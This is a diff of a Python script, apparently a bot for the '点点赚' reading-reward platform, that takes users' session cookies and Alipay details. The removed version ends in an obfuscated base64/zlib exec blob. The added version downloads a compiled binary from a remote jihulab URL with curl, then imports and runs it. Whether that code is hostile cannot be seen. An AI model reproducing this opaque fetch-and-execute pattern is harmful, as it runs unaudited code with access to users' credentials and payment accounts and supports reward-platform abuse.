@@ -1,35 +1,74 @@
 """
-先运行，再提问 电报群https://t.me/xiaoymgroup
-new Env('点点赚');
+先运行脚本，有问题再到群里问 https://t.me/xiaoymgroup
+new Env('点点赚阅读');
 """
-try:
-    import config
-    ddz_config = config.ddz_config
-    ua_list = config.ua_list
-except:
-    """建议将以下设置保存到config.py，以免更新覆盖"""
-    ddz_config={
-    'max_workers': 2,  # 线程数量设置,设置为5，即最多有5个任务同时进行
+import platform
+import sys
+import os
+import subprocess
 
-    'txbz': 8000,  # 设置提现标准,不低于3000，平台3000起提,设置为8000，即为8毛起提
 
-    'sendable': 1,  # 企业微信推送开关,1为开，0为关开启后必须设置qwbotkey才能运行
+def check_environment(file_name):
+    python_info, os_info, cpu_info = sys.version_info, platform.system().lower(), platform.machine().lower() 
+    print(f"Python版本: {python_info.major}.{python_info.minor}.{python_info.micro}, 操作系统类型: {os_info}, 处理器架构: {cpu_info}")
+    if (python_info.minor in [10]) and os_info in ['linux','windows'] and cpu_info in ['x86_64', 'aarch64', 'amd64']:
+        print("符合运行要求")
+        check_so_file(file_name, os_info,cpu_info)
+    else:
+        if not (python_info.minor in [10]):
+            print("不符合要求: Python版本不是3.10")
+        if cpu_info not in ['x86_64', 'aarch64', 'amd64']:
+            print("不符合要求: 处理器架构不是x86_64 aarch64 amd64")
 
-    'pushable': 0,  # wxpusher推送开关,1为开，0为关,开启后必须设置pushconfig才能运行
 
-    'delay_time': 30,  # 并发延迟设置,设置为30即每隔30秒新增一个号做任务，直到数量达到max_workers
+def check_so_file(filename,sys_info, cpu_info):
+    if sys_info == 'windows':
+        filename=os.path.splitext(filename)[0]+'.pyd'
+    if sys_info == 'linux':
+        filename = os.path.splitext(filename)[0]+'.so'
+    if os.path.exists(filename):
+        print(f"{filename} 存在")
+        import ddzyd 
+        ddzyd.main()
+    else:
+        print(f"不存在{filename}文件,准备下载文件")
+        url = f'https://jihulab.com/xizhiai/xiaoym/-/raw/main/{os.path.splitext(filename)[0]}'
+        download_so_file(filename, sys_info, cpu_info,main_url=url)
 
-    'whitelist':[], # 提现白名单设置,白名单中的账号自动提现，填入ck中的name,['name1','name2']。
+def run_command(command):
+    process = subprocess.Popen(
+        command,
+        stdout=subprocess.PIPE,
+        stderr=subprocess.STDOUT, 
+        text=True  
+    )
+    for line in process.stdout:
+        line = line.strip()
+        if "%" in line:
+            print(line)
+    process.wait()
+    return process.returncode
 
-    'zfb_account': '', #支付宝账号
-    
-    'zfb_name': '', #支付宝名字
 
-    'ddzck':[], # ck设置，优先从环境变量中获取，[{'name':'xxx','PHPSESSID':'xxx'},{'name':'xxx','PHPSESSID':'xxx','uid':'UID_xxxxx'}]name值随意，方便自己辨认即可。PHPSESSID是抓包数据。uid是wxpusher一对一通知专属设置，其它情况不要填
-    }
-    """自定义ua"""
-    ua_list = [] # ['ua1','ua2']微信浏览器ua，至少配置一个，否则脚本无法运行，手机端电脑端均可
+def download_so_file(filename, sys_info, cpu_info, main_url):
+    file_base_name = os.path.splitext(filename)[0]
+    if sys_info == 'windows':
+        url = main_url + f'/{file_base_name}.{cpu_info}_{sys_info}.pyd'
+    if sys_info == 'linux':
+        url = main_url + f'/{file_base_name}.{cpu_info}_{sys_info}.so'
+    print(url)
+    # print(github_url)
+    # 您的命令，使用 -# 参数显示下载进度
+    command = ['curl', '-#', '-o', filename, url]
+    # 执行命令并处理输出
+    result = run_command(command)
+    if result == 0:
+        print(f"下载完成：{filename},调用check_so_file funtion")
+        check_so_file(filename,sys_info,cpu_info)
+    else:        
+        print(f"下载失败：{filename}")
+            
 
-import zlib
-import base64
-exec(zlib.decompress(base64.b64decode("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")))
+if __name__ == '__main__':
+    check_environment('ddzyd.so')
+
